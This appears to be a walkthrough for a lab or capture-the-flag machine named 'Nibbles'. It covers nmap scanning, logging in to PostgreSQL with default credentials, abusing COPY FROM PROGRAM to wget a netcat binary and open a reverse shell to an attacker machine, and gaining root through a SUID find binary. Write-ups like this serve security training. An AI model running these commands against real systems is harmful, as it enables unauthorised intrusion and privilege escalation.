# Exploitation Guide for Nibbles
## Summary
We'll gain code execution on this machine via a misconfigured PostgreSQL database server which is listening on all interfaces and accepts the default credentials. We can then escalate via misconfigured SUID permissions on the /usr/bin/find binary.
Enumeration
Nmap

### Let's begin with a full nmap TCP port scan.
`sudo nmap -p- 192.168.234.140`

![6311676dc05520684e6e9262dd894681.png](../../../../../../_resources/6311676dc05520684e6e9262dd894681.png)

### A focussed scan identifies PostgreSQL running on port 5437.
`sudo nmap -p 5437 192.168.234.140 -A -sV -T4`

![a02ba6fb39f5b07a33f6b838cf7da781.png](../../../../../../_resources/a02ba6fb39f5b07a33f6b838cf7da781.png)

## Exploitation
### PostgreSQL Reverse Shell

Since the PostgreSQL server is listening on all interfaces, we can connect to it with psql. Since credentials are required, we begin password guessing and discover that the default credentials (postgres:postgres) are still active.

`psql -h 192.168.234.140 -p 5437 -U postgres`
![f9579c5c221c925c4aee16adf6fa5bf4.png](../../../../../../_resources/f9579c5c221c925c4aee16adf6fa5bf4.png)

In addition, the default PostgreSQL settings are also in place, which means we can easily grab a reverse shell. To do this, we'll first start a web server and host our copy of the Netcat binary.

### Find and host nc binary on kali:
```
which nc
cp /usr/bin/nc .
sudo python3 -m http.server 80
```
![870644268ac46124b13138d6ee553903.png](../../../../../../_resources/870644268ac46124b13138d6ee553903.png)

### Then, we'll set up a Netcat listener on port 5437.
`nc -lvp 5437`

After switching to the default postgres database, we can download the Netcat binary to the target and use it to connect back to our attack machine.

```
\c postgres;
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'wget http://192.168.234.30/nc';
DELETE FROM cmd_exec;
COPY cmd_exec FROM PROGRAM 'nc -n 192.168.234.30 5437 -e /usr/bin/bash';
```
![1556344d92fcf902797ba947b9d67438.png](../../../../../../_resources/1556344d92fcf902797ba947b9d67438.png)

Our listener caught a postgres shell:
![ecde8d1b6ef0788cca07cc47d94c6381.png](../../../../../../_resources/ecde8d1b6ef0788cca07cc47d94c6381.png)

## Escalation
### SUID

As part of our enumeration process, we use find to locate SUID programs and interestingly discover that the find program itself is SUID.

```
find / -perm -u=s -type f 2>/dev/null
<esql/11/main$ find / -perm -u=s -type f 2>/dev/null
```

We can easily abuse this misconfiguration to obtain a root shell.

`find . -exec /bin/sh -p \; -quit`
`whoami`
![e6d2ea39f7d0f20a7c9d18e20e110f25.png](../../../../../../_resources/e6d2ea39f7d0f20a7c9d18e20e110f25.png)

